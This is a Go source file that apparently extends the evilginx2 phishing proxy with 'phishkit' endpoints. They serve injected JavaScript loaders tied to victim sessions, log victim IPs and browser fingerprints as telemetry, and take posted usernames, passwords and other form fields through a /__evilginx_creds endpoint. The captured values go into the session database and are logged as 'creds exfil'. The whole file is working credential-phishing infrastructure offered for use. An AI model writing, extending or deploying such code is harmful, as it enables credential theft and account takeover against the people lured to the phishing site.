package core

import (
	"encoding/json"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/elazarl/goproxy"
	"github.com/kgretzky/evilginx2/log"
)

const phishkitHealthUA = "phishkit-probe"
const phishkitHealthHeader = "X-Phishkit-Healthcheck"

const phishkitLoaderPrefix = "/__phishkit/loader.js"
const phishkitBeaconPath = "/__phishkit/beacon"
const phishkitWhoamiPath = "/__phishkit/whoami"
const phishkitCredsPath = "/__evilginx_creds"

var phishkitProfileRe = regexp.MustCompile(`^[a-z0-9]([a-z0-9-]*[a-z0-9])?$`)

var (
	phishkitBeaconMtx  sync.Mutex
	phishkitBeaconHits = make(map[string][]int64)
)

// phishkitBeaconAllow caps batched telemetry POSTs per session.
func phishkitBeaconAllow(sessionKey string) bool {
	const windowMs int64 = 10000
	const maxHits = 24
	now := time.Now().UnixMilli()
	phishkitBeaconMtx.Lock()
	defer phishkitBeaconMtx.Unlock()
	hits := phishkitBeaconHits[sessionKey]
	fresh := hits[:0]
	for _, t := range hits {
		if now-t < windowMs {
			fresh = append(fresh, t)
		}
	}
	if len(fresh) >= maxHits {
		phishkitBeaconHits[sessionKey] = fresh
		return false
	}
	fresh = append(fresh, now)
	phishkitBeaconHits[sessionKey] = fresh
	return true
}

func isPhishkitHealthProbe(req *http.Request) bool {
	if req == nil {
		return false
	}
	if req.Header.Get(phishkitHealthHeader) == "1" {
		return true
	}
	return strings.Contains(strings.ToLower(req.Header.Get("User-Agent")), phishkitHealthUA)
}

func phishkitRoot() string {
	if r := os.Getenv("PHISHKIT_ROOT"); r != "" {
		return r
	}
	return ""
}

func phishkitLoaderPath(profileID string) string {
	root := phishkitRoot()
	if root == "" || profileID == "" {
		return ""
	}
	if !phishkitProfileRe.MatchString(profileID) {
		return ""
	}
	return filepath.Join(root, "run", "webui", "loaders", profileID+".js")
}

func phishkitTelemetryDir() string {
	root := phishkitRoot()
	if root == "" {
		return ""
	}
	return filepath.Join(root, "run", "telemetry", "events")
}

type phishkitBeaconPayload struct {
	SessionID string                 `json:"session_id"`
	ProfileID string                 `json:"profile_id"`
	Type      string                 `json:"type"`
	Ts        int64                  `json:"ts"`
	Payload   map[string]interface{} `json:"payload"`
}

// HandlePhishkitRequest serves Phishkit loader/beacon/creds endpoints on the phish host.
// Returns non-nil response when the path was handled.
func (p *HttpProxy) HandlePhishkitRequest(req *http.Request, pl *Phishlet, ps *ProxySession) (*http.Request, *http.Response) {
	path := req.URL.Path
	if !strings.HasPrefix(path, "/__phishkit/") && path != phishkitCredsPath {
		return req, nil
	}

	switch {
	case path == phishkitLoaderPrefix || strings.HasPrefix(path, phishkitLoaderPrefix+"?"):
		return p.handlePhishkitLoader(req, pl, ps)
	case path == phishkitBeaconPath && req.Method == http.MethodPost:
		return p.handlePhishkitBeacon(req, pl, ps)
	case path == phishkitWhoamiPath && req.Method == http.MethodGet:
		return p.handlePhishkitWhoami(req, pl, ps)
	case path == phishkitCredsPath && req.Method == http.MethodPost:
		return p.handlePhishkitCreds(req, pl, ps)
	default:
		if strings.HasPrefix(path, "/__phishkit/") {
			resp := goproxy.NewResponse(req, "text/plain", http.StatusNotFound, "not found")
			return req, resp
		}
	}
	return req, nil
}

func (p *HttpProxy) resolvePhishkitSessionID(req *http.Request, pl *Phishlet, ps *ProxySession) string {
	if ps != nil && ps.SessionId != "" {
		return ps.SessionId
	}
	if pl != nil {
		return parseEvilginxSessionIDFromCookie(req, pl.Name, p.cookieName)
	}
	return ""
}

func phishkitClientIP(req *http.Request) string {
	if xff := req.Header.Get("X-Forwarded-For"); xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}
	if xri := req.Header.Get("X-Real-Ip"); xri != "" {
		return strings.TrimSpace(xri)
	}
	if req.RemoteAddr != "" {
		host, _, err := net.SplitHostPort(req.RemoteAddr)
		if err == nil {
			return host
		}
		return req.RemoteAddr
	}
	return ""
}

func (p *HttpProxy) handlePhishkitWhoami(req *http.Request, pl *Phishlet, ps *ProxySession) (*http.Request, *http.Response) {
	body := map[string]interface{}{
		"client_ip":        phishkitClientIP(req),
		"remote_addr":      req.RemoteAddr,
		"x_forwarded_for":  req.Header.Get("X-Forwarded-For"),
		"user_agent":       req.Header.Get("User-Agent"),
		"accept_language":  req.Header.Get("Accept-Language"),
		"sec_ch_ua":        req.Header.Get("Sec-Ch-Ua"),
		"sec_ch_ua_mobile": req.Header.Get("Sec-Ch-Ua-Mobile"),
		"sec_ch_platform":  req.Header.Get("Sec-Ch-Ua-Platform"),
	}
	if sid := p.resolvePhishkitSessionID(req, pl, ps); sid != "" {
		body["session_id"] = sid
	}
	raw, _ := json.Marshal(body)
	resp := goproxy.NewResponse(req, "application/json", http.StatusOK, string(raw))
	resp.Header.Set("Cache-Control", "no-store")
	return req, resp
}

func (p *HttpProxy) handlePhishkitLoader(req *http.Request, pl *Phishlet, ps *ProxySession) (*http.Request, *http.Response) {
	profileID := req.URL.Query().Get("p")
	if profileID == "" {
		profileID = "default"
	}
	loaderFile := phishkitLoaderPath(profileID)
	body := "// phishkit: no loader for profile\n"
	if loaderFile != "" {
		if data, err := os.ReadFile(loaderFile); err == nil && len(data) > 0 {
			body = string(data)
		}
	}
	if sid := p.resolvePhishkitSessionID(req, pl, ps); sid != "" {
		body = "window.__phishkit_evilginx_session=" + strconv.Quote(sid) + ";\n" + body
	}
	resp := goproxy.NewResponse(req, "application/javascript", http.StatusOK, body)
	resp.Header.Set("Cache-Control", "no-store")
	return req, resp
}

func (p *HttpProxy) handlePhishkitBeacon(req *http.Request, pl *Phishlet, ps *ProxySession) (*http.Request, *http.Response) {
	dir := phishkitTelemetryDir()
	if dir == "" {
		resp := goproxy.NewResponse(req, "application/json", http.StatusServiceUnavailable, `{"ok":false}`)
		return req, resp
	}
	raw, err := io.ReadAll(req.Body)
	if err != nil {
		resp := goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"ok":false}`)
		return req, resp
	}
	type phishkitBeaconEnvelope struct {
		SessionID string                  `json:"session_id"`
		ProfileID string                  `json:"profile_id"`
		Type      string                  `json:"type"`
		Ts        int64                   `json:"ts"`
		Payload   map[string]interface{}  `json:"payload"`
		Events    []phishkitBeaconPayload `json:"events"`
	}
	var env phishkitBeaconEnvelope
	if err := json.Unmarshal(raw, &env); err != nil {
		resp := goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"ok":false}`)
		return req, resp
	}
	events := env.Events
	if len(events) == 0 {
		events = []phishkitBeaconPayload{{
			SessionID: env.SessionID,
			ProfileID: env.ProfileID,
			Type:      env.Type,
			Ts:        env.Ts,
			Payload:   env.Payload,
		}}
	}
	sessionKey := sanitizeTelemetryKey(env.SessionID)
	if sessionKey == "" || sessionKey == "unknown" {
		if len(events) > 0 {
			sessionKey = sanitizeTelemetryKey(events[0].SessionID)
		}
	}
	if sessionKey == "" || sessionKey == "unknown" {
		if sid := p.resolvePhishkitSessionID(req, pl, ps); sid != "" {
			sessionKey = sanitizeTelemetryKey(sid)
		}
	}
	if sessionKey == "" {
		sessionKey = "unknown"
	}
	if !phishkitBeaconAllow(sessionKey) {
		resp := goproxy.NewResponse(req, "application/json", http.StatusNoContent, "")
		return req, resp
	}
	if err := os.MkdirAll(dir, 0700); err != nil {
		log.Error("phishkit beacon: mkdir: %v", err)
		resp := goproxy.NewResponse(req, "application/json", http.StatusInternalServerError, `{"ok":false}`)
		return req, resp
	}
	fpath := filepath.Join(dir, sessionKey+".jsonl")
	f, err := os.OpenFile(fpath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		log.Error("phishkit beacon: open: %v", err)
		resp := goproxy.NewResponse(req, "application/json", http.StatusInternalServerError, `{"ok":false}`)
		return req, resp
	}
	now := time.Now().UnixMilli()
	for _, evt := range events {
		if evt.SessionID == "" {
			evt.SessionID = env.SessionID
		}
		if evt.ProfileID == "" {
			evt.ProfileID = env.ProfileID
		}
		if evt.Ts == 0 {
			evt.Ts = now
		}
		if evt.Type == "" {
			evt.Type = "event"
		}
		if evt.Payload == nil {
			evt.Payload = map[string]interface{}{}
		}
		if _, ok := evt.Payload["beacon_client_ip"]; !ok {
			if ip := phishkitClientIP(req); ip != "" {
				evt.Payload["beacon_client_ip"] = ip
			}
		}
		line, err := json.Marshal(evt)
		if err != nil {
			continue
		}
		_, _ = f.Write(append(line, '\n'))
		log.Debug("phishkit beacon: %s session=%s profile=%s", evt.Type, sessionKey, evt.ProfileID)
	}
	_ = f.Close()
	resp := goproxy.NewResponse(req, "application/json", http.StatusNoContent, "")
	return req, resp
}

func sanitizeTelemetryKey(s string) string {
	s = strings.TrimSpace(s)
	if len(s) > 128 {
		s = s[:128]
	}
	out := make([]byte, 0, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_' {
			out = append(out, c)
		}
	}
	return string(out)
}

func (p *HttpProxy) handlePhishkitCreds(req *http.Request, pl *Phishlet, ps *ProxySession) (*http.Request, *http.Response) {
	sid := ""
	if ps != nil {
		sid = ps.SessionId
	}
	if sid == "" && pl != nil {
		sid = parseEvilginxSessionIDFromCookie(req, pl.Name, p.cookieName)
	}
	if sid == "" {
		resp := goproxy.NewResponse(req, "text/plain", http.StatusNoContent, "")
		return req, resp
	}
	body, err := io.ReadAll(req.Body)
	if err != nil {
		resp := goproxy.NewResponse(req, "text/plain", http.StatusBadRequest, "")
		return req, resp
	}
	vals, err := urlParseQuery(string(body))
	if err != nil {
		resp := goproxy.NewResponse(req, "text/plain", http.StatusBadRequest, "")
		return req, resp
	}
	p.session_mtx.Lock()
	defer p.session_mtx.Unlock()
	s, ok := p.sessions[sid]
	if !ok {
		resp := goproxy.NewResponse(req, "text/plain", http.StatusNoContent, "")
		return req, resp
	}
	for k, v := range vals {
		if len(v) == 0 {
			continue
		}
		val := v[0]
		switch k {
		case "username", "email":
			s.SetUsername(val)
		case "password":
			s.SetPassword(val)
		default:
			s.SetCustom(k, val)
			if _, ok := s.BodyTokens[k]; !ok {
				s.BodyTokens[k] = val
			}
		}
	}
	if p.db != nil {
		if s.Username != "" {
			_ = p.db.SetSessionUsername(sid, s.Username)
		}
		if s.Password != "" {
			_ = p.db.SetSessionPassword(sid, s.Password)
		}
		for name, val := range s.Custom {
			_ = p.db.SetSessionCustom(sid, name, val)
		}
		if len(s.BodyTokens) > 0 {
			_ = p.db.SetSessionBodyTokens(sid, s.BodyTokens)
		}
	}
	if ps != nil && ps.Index >= 0 {
		log.Info("[%d] phishkit creds exfil: %s", ps.Index, sid)
	} else {
		log.Info("phishkit creds exfil: %s", sid)
	}
	resp := goproxy.NewResponse(req, "text/plain", http.StatusNoContent, "")
	return req, resp
}

func urlParseQuery(s string) (map[string][]string, error) {
	out := make(map[string][]string)
	if s == "" {
		return out, nil
	}
	pairs := strings.Split(s, "&")
	for _, pair := range pairs {
		kv := strings.SplitN(pair, "=", 2)
		key := kv[0]
		val := ""
		if len(kv) > 1 {
			val = kv[1]
		}
		key, _ = urlQueryUnescape(key)
		val, _ = urlQueryUnescape(val)
		out[key] = append(out[key], val)
	}
	return out, nil
}

func urlQueryUnescape(s string) (string, error) {
	replacer := strings.NewReplacer("+", " ")
	return replacer.Replace(s), nil
}

func parseEvilginxSessionIDFromCookie(req *http.Request, plName string, cookieName string) string {
	if plName == "" {
		return ""
	}
	cname := getSessionCookieName(plName, cookieName)
	c, err := req.Cookie(cname)
	if err != nil {
		return ""
	}
	return c.Value
}

func parseProfileFromLureInfo(p *HttpProxy) string {
	if p == nil || p.cfg == nil {
		return ""
	}
	for _, l := range p.cfg.lures {
		if l.Info != "" && strings.HasPrefix(l.Info, "profile:") {
			return strings.TrimPrefix(l.Info, "profile:")
		}
	}
	return ""
}

// ResolvePhishkitProfile returns profile id for loader.js from query or lure config.
func (p *HttpProxy) ResolvePhishkitProfile(req *http.Request) string {
	if q := req.URL.Query().Get("p"); q != "" && phishkitProfileRe.MatchString(q) {
		return q
	}
	return parseProfileFromLureInfo(p)
}
